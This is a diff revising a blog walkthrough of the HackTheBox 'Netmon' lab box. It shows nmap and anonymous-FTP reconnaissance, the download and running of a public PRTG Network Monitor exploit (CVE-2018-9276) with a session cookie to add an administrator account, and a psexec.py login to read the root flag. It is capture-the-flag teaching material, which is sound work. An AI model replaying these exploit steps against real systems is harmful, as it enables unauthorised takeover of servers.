@@ -2,27 +2,29 @@
 title: "HackTheBox | Netmon - Writeup"
 excerpt: Writeup for Netmon from HackTheBox
 date: 2019-07-01 00:00:00
-categories: [cybersec, infosec, hackthebox]
-tags: [authenticated rce, ftp, network monitor, PRTG, rce]
+categories: [HackTheBox]
 ---
 
 ## Information
-Netmon is a Windows box that is on HackTheBox. This machine has several ways to achieve the given secondary task; from 
-a reverse shell to a Powershell RCE within PRTG Network Monitor.
+Netmon is a Windows fairly straight forward box that is available on HackTheBox. 
+
+Netmon's main goal is to gain control over a vulnerable PRTG Network Monitor installation and capture the root flag in 
+several different ways; from a Powershell reverse shell to an authenticated RCE which adds a new user in the system.
 
 ## Tasks
-- Find the user password
-- Find the root password
+- Capture the user flag
+- Capture the root flag
  
 ## Summary
 - Use `nmap` to see the services
 - Use `ncftp` to navigate through its `FTP`
-- Login to the PRTG Network Manager panel to use `CVE-2018-9276` to create a new administrator in the system
+- Login to the PRTG Network Manager panel
+- Use `CVE-2018-9276` (Authenticated RCE) to create a new administrator in the system
 - Login to the system with the new credentials via `psexec.py`
  
 ## Walkthrough
 ### nmap
-First, we begin with a standard `nmap` scan.
+We begin with a standard `nmap` scan to see the services that we'll be dealing with.
 
 ```
 $ nmap -sC -sV 10.10.10.152
@@ -49,11 +51,11 @@ PORT    STATE SERVICE      VERSION
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 ```
 
-The scan tells us that there is `HTTP` on Port 80 with PRTG Network Monitor installed on it and `FTP` on Port 21 
-which we can login to it anonymously.
+We can see that 5 services are running but the most notable ones are `HTTP` on Port 80 with PRTG Network Monitor 
+installed on it and `FTP` on Port 21 with anonymous login enabled.
 
 ### User Flag
-Let's take a look at the `FTP` by logging in anonymously.
+Taking a look at the `FTP` by logging in anonymously, we see `user.txt` in `C:/Users/Public`.
 
 ```
 $ ncftp 10.10.10.152
@@ -95,8 +97,8 @@ Taking a look at the `HTTP` service, we're greeted with a login page for PRTG Ne
 
 ![PRTG Mainscreen][PRTG Mainscreen]
 
-Trying to login in using `prtgadmin`/`prtgadmin` was no use. As a result, snooping around the FTP in hopes of finding 
-some files regarding the login credentials was fruitful as there were 3 configuration files in 
+Trying to login in using common credentials such as `admin`/`password` or `prtgadmin`/`prtgadmin` is no use. Returning 
+to the `FTP` and snooping around PRTG Network Monitor's folders reveal 3 configuration files in 
 `C:\ProgramData\Paessler\"PRTG Network Monitor"`.
 
 ```
@@ -194,14 +196,8 @@ PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting
 -------------------------------------------------------------------------------
 ```
 
-Taking a look at [Exploit-DB][Exploit-DB] tells us how to use the exploit.
-
-```
-EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
-```
-
-Since we logged in to PRTG Network Manager, we can use the developer console to see what cookies we have; which is 
-`OCTOPUS`, and use that to use the exploit.
+Since we logged in to PRTG Network Manager, we can use the developer console to see our cookies use them to run the 
+exploit.
 
 ```
 $ wget https://www.exploit-db.com/download/46527
@@ -209,23 +205,27 @@ $ wget https://www.exploit-db.com/download/46527
 $ sed -i -e 's/\r$//' 46527
 
 $ ./46527 -u http://10.10.10.152 -c "OCTOPUS1813713946=ezk4RkMxM0M4LTkxMzYtNEVDOS1CODgwLTc4OUY5QjJERjJFN30%3D; _gat=1"
+
+[...]
+
 [*] file created
-[*] sending notification wait....
+[*] sending notification wait...
 
 [*] adding a new user 'pentest' with password 'P3nT3st'
-[*] sending notification wait....
+[*] sending notification wait...
 
 [*] adding a user pentest to the administrators group
-[*] sending notification wait....
+[*] sending notification wait...
 
 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
 ```
 
-This created a new user that had administrative privileges; `pentest` with the password `P3nT3st!`. Using `psexec.py` 
-from `impacket` we can get a shell and login as `pentest` to get our root flag.
+The exploit added a new user that had administrative privileges; `pentest` with the password `P3nT3st!`. Using 
+`psexec.py` from [impacket][impacket]{:target="_blank"}  we can get a shell and login as `pentest` to get our root 
+flag. Do note that `psexec.py` was copied from `/usr/share/doc/python-impacket/examples/`.
 
 ```
-$ /usr/share/doc/python-impacket/examples/psexec.py pentest:'P3nT3st!'@10.10.10.152
+$ psexec.py pentest:'P3nT3st!'@10.10.10.152
 
 C:\Windows\system32> cd C:\Users\Administrator\
 
@@ -257,6 +257,6 @@ C:\Users\Administrator\Desktop> type root.txt
 
 Thus, we've captured the root flag.
 
-[PRTG Mainscreen]:  /images/posts/2019-07-01-htb-netmon/PRTG%20Mainscreen.png
-[PRTG Panel]:       /images/posts/2019-07-01-htb-netmon/PRTG%20Panel.png
-[Exploit-DB]:       https://www.exploit-db.com/exploits/46527
+[PRTG Mainscreen]:  /images/2019-07-01-htb-netmon/PRTG%20Mainscreen.png
+[PRTG Panel]:       /images/2019-07-01-htb-netmon/PRTG%20Panel.png
+[impacket]:         https://github.com/SecureAuthCorp/impacket
